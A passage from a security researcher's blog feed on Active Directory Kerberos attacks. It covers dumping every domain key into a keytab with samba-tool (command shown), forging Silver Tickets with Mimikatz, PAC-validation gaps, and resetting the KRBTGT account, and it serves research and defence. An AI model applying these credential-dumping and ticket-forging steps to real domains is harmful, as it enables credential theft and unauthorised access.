/&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-cU-CQjk9NBU/V09kCv4epQI/AAAAAAAAAQQ/2BNHDwqDWxYc6LyQsIkQFt_j-PqEAyGTACLcB/s1600/samba-tool1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://1.bp.blogspot.com/-cU-CQjk9NBU/V09kCv4epQI/AAAAAAAAAQQ/2BNHDwqDWxYc6LyQsIkQFt_j-PqEAyGTACLcB/s1600/samba-tool1.jpg&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, this scrolls on for a bit until it&#39;s pumped the DC dry. &amp;nbsp;The next step takes the data from here and generates a keytab file with everything in it. &amp;nbsp;Note this step takes a long time. &amp;nbsp;On my machine it took a few hours. &amp;nbsp;There might be a way to optimize things a tad if you don&#39;t want everything.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Anywhoo... without further ado:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;i&gt;samba-tool domain exportkeytab &amp;lt;filename&amp;gt; -s &amp;lt;path to configfile&amp;gt;&lt;/i&gt;&lt;/div&gt;&lt;div&gt;&lt;i&gt;&lt;br /&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-HF5FAD75h_Y/V09nOx0nWvI/AAAAAAAAAQk/BZfx0UgJqmo4wHT5IFyGWuACbAVS9XajQCLcB/s1600/samba-tool2.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://2.bp.blogspot.com/-HF5FAD75h_Y/V09nOx0nWvI/AAAAAAAAAQk/BZfx0UgJqmo4wHT5IFyGWuACbAVS9XajQCLcB/s1600/samba-tool2.jpg&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;i&gt;&lt;br /&gt;&lt;/i&gt;&lt;/div&gt;&lt;div&gt;Note that the new keytab can be whatever you want it to be, however the config file was actually generated by the previous command. &amp;nbsp;Like I said earlier, this command takes a while for my largish domain, but I ended up with a keytab file with all keys (AES, NTLM, DES) from the domain. &amp;nbsp;And in a much more compact format. &amp;nbsp;My combined file for the domain is ~6meg.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;You can list the keys contained in a keytab file using ktutil and can even get the actual keys themselves if you tack on &#39;--keys&#39;. &amp;nbsp;Muahahahahahahahahaha&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-bjNdVj6Druc/V09p4hld8-I/AAAAAAAAAQw/azhSQsBuotYFwmIH5eGUHmsmOexNLk8vQCLcB/s1600/samba-tool3.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;408&quot; src=&quot;https://2.bp.blogspot.com/-bjNdVj6Druc/V09p4hld8-I/AAAAAAAAAQw/azhSQsBuotYFwmIH5eGUHmsmOexNLk8vQCLcB/s640/samba-tool3.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Final Deep Thoughts with @Passingthehash&lt;/h2&gt;&lt;div&gt;So digging into it a tad, it looks like samba-tool is just a bunch of python code, so I think it should be possible to make some changes to make it more useful for the average pentester. &amp;nbsp;For example, rip out the code to just do the domain replication. &amp;nbsp;Also, make it an option whether or not to have computer accounts in the keytab, or limit the keytypes recovered. &amp;nbsp;That aught to make things go much faster. &amp;nbsp;Anyways, enjoy and have fun kids!&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/1564899024523429729/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/1564899024523429729'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/1564899024523429729'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html' title='*NIX Kerberos + MS Active Directory fun and games'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://3.bp.blogspot.com/-lcZcBsaBff0/V09SaI5JcCI/AAAAAAAAAPQ/J7bjmJGNilEvW-iizmMa5fFIciuHwxm5gCLcB/s72-c/kinit-klist.jpg" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-7676735069721744259</id><published>2015-04-05T13:29:00.000-07:00</published><updated>2015-04-05T13:29:17.533-07:00</updated><title type='text'>No, Microsoft Hasn&#39;t &quot;Fixed&quot; Silver Tickets</title><content type='html'>Contrary to what many folks might think, I don&#39;t wait around on the Internet for somebody to be wrong to blog about it. &amp;nbsp;However, when somebody misrepresents research that myself and others have worked on, there&#39;s something to talk about. &amp;nbsp;Especially if this &quot;advice&quot; leads to sweeping incorrect statements that could lead C-level folks to think that an entire class of problems has been fixed when they haven&#39;t. &amp;nbsp;This is a problem :/&lt;br /&gt;&lt;br /&gt;The post is here:&amp;nbsp;http://blog.varonis.com/microsoft-fixes-kerberos-silver-ticket-vulnerability/&lt;br /&gt;&lt;br /&gt;It&#39;s also a bit old, from December of last year, but @Gentilkiwi (Ben / Author of Mimikatz) recently pointed it out.&lt;br /&gt;&lt;br /&gt;And it makes enough mistakes and confuses enough concepts that I felt it necessary to make sure at least one source on the web corrects the misconceptions....&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;What He Got Right&lt;/h2&gt;&lt;div&gt;The author did a decent job in previous blog entries (at least from a skim) of explaining the Kerberos process and has a decent grasp on Golden Ticket Attacks. &amp;nbsp;I&#39;ll also forgive him for not updating the post or referencing in a new post Microsoft&#39;s official KRBTGT changing script found here: (blog)&amp;nbsp;http://blogs.microsoft.com/cybertrust/2015/02/11/krbtgt-account-password-reset-scripts-now-available-for-customers/&lt;/div&gt;&lt;div&gt;(download)&amp;nbsp;https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Where Things Go South&lt;/h2&gt;&lt;div&gt;So things start getting a little misunderstood talking about Service Tickets. &amp;nbsp;There&#39;s a couple points I would like to make. &amp;nbsp;Generally speaking :&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;1) Service tickets destined for something the target computer deals with (file shares, rpc calls, etc) use the target computer&#39;s AD account to sign the service ticket. &amp;nbsp;The computer account is (by default) changed every 30 days or so and has a long random unicode password. &amp;nbsp;You in all likelihood will never be able to guess this password. &amp;nbsp;However, with local admin on the box or physical access, they are trivial to recover.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;2) Service tickets destined for a service running as a different account (SQL server, Exchange Server, etc) will use the service account password for that particular service as the signing key for Kerberos requests. &amp;nbsp;There is a chance you can guess these passwords, since they are service accounts. &amp;nbsp;Tim Medin&#39;s research focuses on getting something to crack offline by creating a fake SPN (service principal name) and requesting service ticket(s) (&amp;nbsp;https://github.com/nidem/kerberoast /&amp;nbsp;http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin )&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Silver tickets allow an attacker to generate arbitrary service tickets when the attacker has the service account hash / password. &amp;nbsp;PAC validation is disabled by default for accounts running as services. &amp;nbsp;For more details, refer to one of my previous posts which quotes the official MS specs :&amp;nbsp;http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;No, MS14-068 Did &lt;u&gt;NOT&lt;/u&gt; Fix Silver Tickets&lt;/b&gt;&lt;/h2&gt;&lt;div&gt;Joe Bialek from Microsoft did a great job of talking about the vulnerability fixed by MS14-068 here:&amp;nbsp;http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The short version is that prior to this patch there was an edge case in the Kerberos spec that could allow an attacker with a user account password/hash to modify the PAC and then the KDC would validate it as legit. The end result was an elevated TGT account. &amp;nbsp;&lt;b&gt;This is completely unrelated to silver tickets. &amp;nbsp;This was an exploit against Kerberos.&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Silver tickets will continue to work with the MS14-048 patch installed.&lt;/div&gt;&lt;h2&gt;A Note to the Author&lt;/h2&gt;&lt;div&gt;Mr. Green, feel free to reach out to me, @gentilkiwi, or @josephbialek if you need any more clarification.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/7676735069721744259/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2015/04/no-microsoft-hasnt-fixed-silver-tickets.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/7676735069721744259'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/7676735069721744259'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2015/04/no-microsoft-hasnt-fixed-silver-tickets.html' title='No, Microsoft Hasn&#39;t &quot;Fixed&quot; Silver Tickets'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-97782694652516760</id><published>2015-02-14T10:05:00.001-08:00</published><updated>2015-02-14T12:18:33.441-08:00</updated><title type='text'>Microsoft Finally Releases Guidance and a Script to Change the KRBTGT Account</title><content type='html'>So Microsoft recently released a zipfile which contains both a document and a powershell script that can be used to change the KRBTGT in a domain. &amp;nbsp;Before doing anything, RTFM that comes with it and obviously run it in a test environment and make sure that it doesn&#39;t eat kittens in your environment...&lt;br /&gt;&lt;br /&gt;The basic functionality of the powershell script is that it changes the KRBTGT and it will force replication to update the KRBTGT account and validate that it has replicated.&lt;br /&gt;&lt;br /&gt;I haven&#39;t (and likely won&#39;t ) spend a lot of time on the script itself. &amp;nbsp;However, one of the things that came up on Twitter from @scriptjunkie1 was that the password being set wasn&#39;t using a decent random source, so the password wouldn&#39;t be as random as it could be. &lt;br /&gt;&lt;br /&gt;However, based on conversations I&#39;ve had with folks at Microsoft, this password doesn&#39;t matter. &amp;nbsp;This is of course undocumented and honestly, this could potentially lead to problems with clever administrators, however I will get to this a little later...&lt;br /&gt;&lt;br /&gt;So, in this case I set up a throwaway Windows 2008 R2 domain controller. &amp;nbsp;I used Mimikatz to dump the KRBTGT hash.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-nu-e7AIsrGA/VN-G-RWr0_I/AAAAAAAAAKw/mTE3F3zo9n8/s1600/initial%2Bkrbtgt1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://4.bp.blogspot.com/-nu-e7AIsrGA/VN-G-RWr0_I/AAAAAAAAAKw/mTE3F3zo9n8/s1600/initial%2Bkrbtgt1.jpg&quot; height=&quot;208&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So, by default, the KRBTGT account has a random 32 byte unicode password assigned to it that is completely unprintable, so it&#39;s easiest to just see the hash...&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-uxIyWUpFHhA/VN-HLdf1YnI/AAAAAAAAALQ/nYP6HEc6WtI/s1600/krbtgt_expected_hash.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-uxIyWUpFHhA/VN-HLdf1YnI/AAAAAAAAALQ/nYP6HEc6WtI/s1600/krbtgt_expected_hash.jpg&quot; height=&quot;468&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;I am using this 8 character complex, yet terrible, password. &amp;nbsp;If an actual account was set to this, the NT hash would look like the above screen.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-YHCxFGbsMeA/VN-HAuRprCI/AAAAAAAAAK8/NphUxd0k_Gk/s1600/krbtgt_changed_2.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://4.bp.blogspot.com/-YHCxFGbsMeA/VN-HAuRprCI/AAAAAAAAAK8/NphUxd0k_Gk/s1600/krbtgt_changed_2.jpg&quot; height=&quot;308&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: left;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: left;&quot;&gt;Using the &#39;net user&#39; command, we can set the password for the KRBTGT account, but as you can see above, the hash from setting the password to &#39;1qaz@WSX&#39; is not the same hash from above. &amp;nbsp;Ok, what happens if we do it again?&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-XGz2vJu98s4/VN-HAgnxE1I/AAAAAAAAAK4/j1_88HoYVVc/s1600/krbtgt_3.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://2.bp.blogspot.com/-XGz2vJu98s4/VN-HAgnxE1I/AAAAAAAAAK4/j1_88HoYVVc/s1600/krbtgt_3.jpg&quot; height=&quot;424&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So, the hash changes again. &amp;nbsp;Even though we set it to the same password, it changes again to a random password / hash.&lt;br /&gt;&lt;br /&gt;One thing to note, even though the password is completely ignored, it needs to clear whatever the password policy is in play on the domain.&lt;br /&gt;&lt;br /&gt;So, why is this behavior a bad thing? &amp;nbsp;Well Microsoft&#39;s unofficial stance is that they want people to use strong passwords (even though it&#39;s completely ignored). &amp;nbsp;However, a clever administrator would INCORRECTLY believe that they could type in the same password on each DC and shortcut the replication process. &lt;br /&gt;&lt;br /&gt;So would this completely brick your environment if you did this? Honestly I don&#39;t know. &amp;nbsp;Late last year @mubix talked about an environment where the KRBTGT was changed on a semi-constant manner and it didn&#39;t break the environment. &amp;nbsp;So (offline) myself and a few others fiddled with it a bit and it looks like that could work, but only because when the tickets are invalidated the credentials that are cached in memory are immediately resubmitted and new tickets are issued. &lt;br /&gt;&lt;br /&gt;So what happens if you fsck up the KRBTGT across multiple domain controllers? &amp;nbsp;Honestly I don&#39;t know and don&#39;t really have a good way to easily test this. Do you really want to find out in your environment?&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;Correction 1:&lt;br /&gt;&lt;br /&gt;Benjamin Delpy (@gentilkiwi) says that the KRBTGT password is a 32-byte random password (which would actually be 16 unicode chars). &amp;nbsp;Since he&#39;s poked around in memory on DC&#39;s far more than I have, I&#39;m going with his answer :-) &amp;nbsp;Corrected in the post</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/97782694652516760/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2015/02/microsoft-finally-releases-guidance-and.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/97782694652516760'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/97782694652516760'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2015/02/microsoft-finally-releases-guidance-and.html' title='Microsoft Finally Releases Guidance and a Script to Change the KRBTGT Account'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://4.bp.blogspot.com/-nu-e7AIsrGA/VN-G-RWr0_I/AAAAAAAAAKw/mTE3F3zo9n8/s72-c/initial%2Bkrbtgt1.jpg" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-6357050760634459351</id><published>2014-09-27T13:23:00.000-07:00</published><updated>2014-09-27T13:23:29.584-07:00</updated><title type='text'>PAC Validation, The 20 Minute Rule and Exceptions (BHUSA 2014 part deux)</title><content type='html'>First off, I apologize for not being quicker about getting this post out. &amp;nbsp;However, Wasteland 2 came out recently, and I have been playing far too much of it for my own good ;-)&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Anyways onto the topic at hand: PAC validation and the various excuses not to check it&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;What is PAC Validation and Why Do I Care?&lt;/h2&gt;&amp;nbsp;The PAC (Privilaged Attribute Certificate) is a structure contained in a Kerberos ticket that contains a list of privileges that the ticket is representing, along with some other stuff. &amp;nbsp;If we can forge the PAC we can do things to break the privilege model of Kerberos &amp;nbsp;in some very interesting ways ;-)&lt;br /&gt;&lt;br /&gt;&quot;PAC validation&quot; is pretty much what it sounds like, the service receiving the ticket double checks the information contained in the PAC as being valid before either issuing service tickets (in the event of a Ticket Granting Ticket / TGT) or running the command/request/whatever (in the event of a service ticket being used). &lt;br /&gt;&lt;br /&gt;&lt;h2&gt;The 20 Minute Rule&amp;nbsp;&lt;/h2&gt;&lt;div&gt;What we&#39;re calling &quot;The 20 Minute Rule&quot; is taken straight out of the Microsoft&#39;s MS-KILE specification, specifically section 5.1.3 which states:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;i&gt;&quot;Kerberos V5 does not provide account revocation checking for TGS requests, which allows TGT renewals and service tickets to be issued as long as the TGT is valid even if the account has been revoked. KILE provides a check account policy (section 3.3.5.7.1) that limits the exposure to a shorter time. KILE KDCs in the account domain are required to check accounts when the TGT is older than 20 minutes. This limits the period that a client can get a ticket with a revoked account while limiting the performance cost for AD queries.&quot;&lt;/i&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So to translate, in the event that the TGT is more than 20 minutes old, the PAC contents are validated to ensure that the account is still valid. &amp;nbsp;However to flip this around, this means that there&#39;s a 20 minute window where the contents ARE NOT validated. &amp;nbsp;This is one of the primary things we brought up in our Black Hat talk. &amp;nbsp;As long as you have the KRBTGT hash you can put whatever information you want into the PAC inside the TGT, and service tickets will be issued, as long as the age of the TGT is less that 20 minutes old. &amp;nbsp;This includes bogus account / SID information, such as a non-existent user being a member of the domain admins group. &amp;nbsp;Because the information isn&#39;t validated during this first 20 minute window, service tickets will be generated that are good for several hours by default. &amp;nbsp;Additionally, since we can create our own TGTs, the 20 minute rule is never really a problem since we can simply create a new TGT every 20 minutes to get around this limitation.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Other PAC Validation Issues&lt;/h2&gt;&lt;div&gt;So obviously, this can lead to some problems, but are there any other examples lurking out there? &amp;nbsp;I&#39;m glad you asked!&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Recently @gentilkiwi and I have been investigating another issue related to a failure of PAC validation that Ben has dubbed a &#39;Silver Ticket&#39;. &amp;nbsp; Here&#39;s the section of relevant protocol specification from the holy Microsoft MS-APDS scripture Appendix A, Section 1.6.2:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&quot;&lt;/div&gt;&lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;i&gt;Windows 2000 Server and Windows XP do not validate the PAC when the application server is running under the local system context or has SeTcbPrivilege, as specified in [MS-LSAD] section 3.1.1.2.1. Otherwise, Windows 2000 Server and Windows XP use Kerberos PAC validation.&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;Windows Server 2003 does not validate the PAC when the application server is running under the local system context, the network service context, or has SeTcbPrivilege. Otherwise, Windows Server 2003 uses Kerberos PAC validation.&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;Windows Server 2003 with SP1 does not validate the PAC when the application server is under the local system context, the network service context, the local service context, or has SeTcbPrivilege privilege. Otherwise, Windows Server 2003 with SP1 and future service packs use Kerberos PAC validation.&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1, and Windows Server 2012 R2 do not validate the PAC by default for services. Windows still validates the PAC for processes that are not running as services. PAC validation can be enabled when the application server is not running in the context of local system, network service, or local service; or it does not have SeTcbPrivilege, as specified in [MS-LSAD] section 3.1.1.2.1.&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&quot;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, in general older versions of Windows don&#39;t validate the PAC when the process is running as SYSTEM or has the &quot;SeTcbPrivilege&quot; (Act as part of the operating system) privilege set. &amp;nbsp;Newer versions (Vista+) don&#39;t check the PAC for services.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, how is this useful? &amp;nbsp;Well, pretty much anything that you could want to do to a computer remotely is a service, such as access a file share, schedule a task, execute code, etc...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, for Kerberos, services by default don&#39;t validate PAC settings... What could possibly go wrong here? &amp;nbsp;But wait! There&#39;s more!&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Service Tickets and Kerberos&amp;nbsp;&lt;/h2&gt;&lt;div&gt;The obvious question now arises, what do we need to issue a service ticket for a particular service? &amp;nbsp;How can we take advantage of this?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Service tickets SHOULD be issued by a TGS after getting a TGT and should be between 2 Kerberos principals. &amp;nbsp;So for example, if Bob wants to access a file share (CIFS) on ServerA, Bob would ask the TGS to give him a ticket for user CIFS@ServerA. &amp;nbsp;The TGS would then give Bob a ticket that he could present to ServerA that would give him access to the CIFS service.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;With TGTs, the piece destined for the TGS would need to be signed by the KRBTGT account, the central account for trust to validate that the ticket is legit. &amp;nbsp;However, for service tickets, the target account is on the computer itself. &amp;nbsp;What is the long term secret key? &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;In short, it depends. &amp;nbsp;For all services that run as System on the computer, it will be the computer account from AD. &amp;nbsp; If the service is operating as a particular user (typically like Sharepoint, Exchange, &amp;nbsp;MSSQL, etc...) it will be that account.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Recovering the computer account is relatively trivial with physical access (think boot disk, grab the registry, decode at whim) and if you can run as admin, it&#39;s trivial as well... &amp;nbsp;If you can guess the service account password for a service that runs as a different user, that will work too...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Now, all you have to do is use Mimikatz to generate a Silver Ticket for the service and away you go... &amp;nbsp;an example that Ben posted to twitter can be seen here:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-ntn6xVIt_rs/VCcY3NrHt6I/AAAAAAAAAJY/b9hhfjcBtVI/s1600/ByichjnIEAAkHf-.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-ntn6xVIt_rs/VCcY3NrHt6I/AAAAAAAAAJY/b9hhfjcBtVI/s1600/ByichjnIEAAkHf-.png&quot; height=&quot;454&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Since service tickets are identical in format to TGTs albeit with a different service name, all you need to do is specify a different service name and use the RC4 (NTLM hash) of the account password (either the computer account for default services or the actual account) and you can now issue service tickets for the requested service. &amp;nbsp;Note: &amp;nbsp;You can also use the AES keys if you happen to have them instead of the NTLM key and it will still work ;-)&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;It is worth noting, that services like MSSQL, Sharepoint, etc will only allow you to play with those services. &amp;nbsp;The computer account will allow access to CIFS, service creation, and a whole host of other activities on the targeted computer. &amp;nbsp;You can leverage the computer account into a shell with PSEXEC and you will be running as system on that particular computer. &amp;nbsp;Lateral movement is then a matter of doing whatever you need to do from there :-)&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;My next post I will perform some demos with screenshots, etc... &amp;nbsp;Stay tuned!&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/6357050760634459351/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html#comment-form' title='1 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6357050760634459351'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6357050760634459351'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html' title='PAC Validation, The 20 Minute Rule and Exceptions (BHUSA 2014 part deux)'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://1.bp.blogspot.com/-ntn6xVIt_rs/VCcY3NrHt6I/AAAAAAAAAJY/b9hhfjcBtVI/s72-c/ByichjnIEAAkHf-.png" height="72" width="72"/><thr:total>1</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-624733175774351488</id><published>2014-08-21T19:40:00.000-07:00</published><updated>2014-08-21T19:40:37.559-07:00</updated><title type='text'>Mimikatz and Golden Tickets... What&#39;s the BFD? BlackHat USA 2014 Redux part 1</title><content type='html'>So a couple weeks ago Benjamin Delpy (@gentilkiwi on twitter / author of Mimikatz ) and myself presented at Blackhat USA and, in a somewhat impromptu manner, the Wall of Sheep at DefCon as well... &lt;br /&gt;&lt;br /&gt;The updated slides (from the WoS talk) can be found 